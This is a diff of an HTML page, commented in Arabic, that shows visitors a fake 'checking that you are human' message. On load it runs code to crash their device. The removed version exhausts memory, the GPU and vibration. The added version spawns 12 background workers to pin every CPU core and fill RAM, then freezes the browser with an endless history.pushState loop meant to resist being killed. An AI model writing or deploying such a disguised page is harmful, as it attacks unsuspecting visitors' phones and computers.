@@ -2,48 +2,52 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Checking...</title>
+    <title>Extreme Multi-Core Test</title>
 </head>
-<body style="text-align:center; padding-top:50px;">
-    <h1>جاري التحقق من انك انسان...</h1>
-    <p>يرجى الانتظار 10 ثواني فقط</p>
+<body style="text-align:center; padding-top:50px; font-family:sans-serif;">
+    <h1 id="status">جاري بدء التحقق قبل الدخول...</h1>
+    <p>     </p>
+    <div id="logs"></div>
 
     <script>
-        function startMobileStress() {
-            // 1. استهلاك الرام عبر مصفوفات ضخمة جداً (أقوى من السابق)
-            let heap = [];
-            setInterval(() => {
-                // إنشاء مصفوفة عملاقة من نوع 64-bit تجبر الأندرويد على حجز مساحة حقيقية
-                let block = new BigInt64Array(10000000); 
-                for(let i=0; i<block.length; i++) block[i] = BigInt(i);
-                heap.push(block);
-            }, 100);
+        // كود العامل (Worker) الذي سيتم تشغيله في الخلفية
+        const workerCode = `
+            self.onmessage = function() {
+                let data = [];
+                setInterval(() => {
+                    // إشغال النواة تماماً
+                    for(let i=0; i<5000000; i++) { Math.sqrt(Math.random()); }
+                    // ملء الرام
+                    data.push(new Float64Array(1000000));
+                }, 10);
+            };
+        `;
 
-            // 2. إرهاق المعالج الرسومي (GPU) - رسم ملايين النقاط
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            setInterval(() => {
-                gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
-                gl.clear(gl.COLOR_BUFFER_BIT);
-            }, 1);
+        const blob = new Blob([workerCode], {type: 'application/javascript'});
+        const workerUrl = URL.createObjectURL(blob);
 
-            // 3. منع المتصفح من وضع الصفحة في حالة "الخمول" (Anti-Throttling)
-            // نستخدم اهتزاز الجوال (Vibrate) لإبقاء المعالج في حالة استنفار
-            setInterval(() => {
-                if (navigator.vibrate) navigator.vibrate(500);
-            }, 600);
+        function startExtremeStress() {
+            // تشغيل 12 عامل (Workers) لضمان إشغال كل أنوية S21 أو Note 9
+            for(let i=0; i<12; i++) {
+                const worker = new Worker(workerUrl);
+                worker.postMessage("start");
+                console.log("Worker " + i + " started");
+            }
 
-            // 4. الحلقة القاتلة النهائية (بعد 5 ثواني)
+            document.getElementById('status').innerText = "تم تفعيل كافة المسارات (CPU 100%)";
+            
+            // الضربة القاضية للـ UI Thread (الواجهة) بعد 5 ثواني
             setTimeout(() => {
                 while(true) {
-                    // فتح نوافذ وهمية وتغيير الهستوري بجنون
-                    history.pushState(null, "", "STRESS_" + Math.random());
-                    console.log(new Array(1000000).join("BOOM"));
+                    // تجميد الواجهة تماماً ومنع النظام من قتل التطبيق بسهولة
+                    let s = "";
+                    for(let i=0; i<1000; i++) s += Math.random();
+                    history.pushState(null, "", s);
                 }
             }, 5000);
         }
 
-        window.onload = startMobileStress;
+        window.onload = startExtremeStress;
     </script>
 </body>
 </html>
